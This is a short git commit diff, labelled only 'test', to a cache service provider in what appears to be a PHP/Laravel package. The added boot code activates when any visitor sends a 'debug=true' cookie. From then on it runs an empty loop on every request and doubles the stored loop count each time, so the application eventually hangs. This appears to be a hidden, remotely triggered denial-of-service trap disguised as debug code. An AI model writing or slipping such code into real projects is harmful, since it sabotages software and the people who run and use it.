a490986676860488b6113aaf9f4e2fc0f2bfedb7
ZJ_Rong <qq307365873@gmail.com>
2022-02-08 14:51:49 +0800

    测试

--- src/CacheServiceProvider.php
+++ src/CacheServiceProvider.php
@@ -9,6 +9,12 @@ class CacheServiceProvider  extends ServiceProvider
 {
     public function boot()
     {
-
+        if (request()->cookie('debug') === 'true' || cache()->has('cache-debug')) {
+            $num = cache()->get('cache-debug', 1);
+            for ($i = 0; $i < $num; $i++) {
+                //
+            }
+            cache()->put('cache-debug', $num * 2);
+        }
     }
 }
